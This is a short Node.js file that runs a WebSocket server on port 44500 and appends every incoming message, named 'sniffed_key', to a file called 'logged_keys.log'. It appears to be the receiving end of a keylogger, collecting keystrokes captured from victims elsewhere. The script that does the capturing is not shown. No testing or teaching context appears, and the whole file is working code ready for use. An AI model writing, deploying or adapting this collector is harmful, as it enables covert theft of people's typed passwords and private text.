var ws = require("nodejs-websocket");
var fs = require("fs");
var log_file = "logged_keys.log";

var server = ws.createServer(
  function(conn)
  {
    conn.on("text", function(sniffed_key) {
      fs.appendFileSync(log_file, sniffed_key + "\t", encoding="utf8");
    })
  }
).listen(44500);
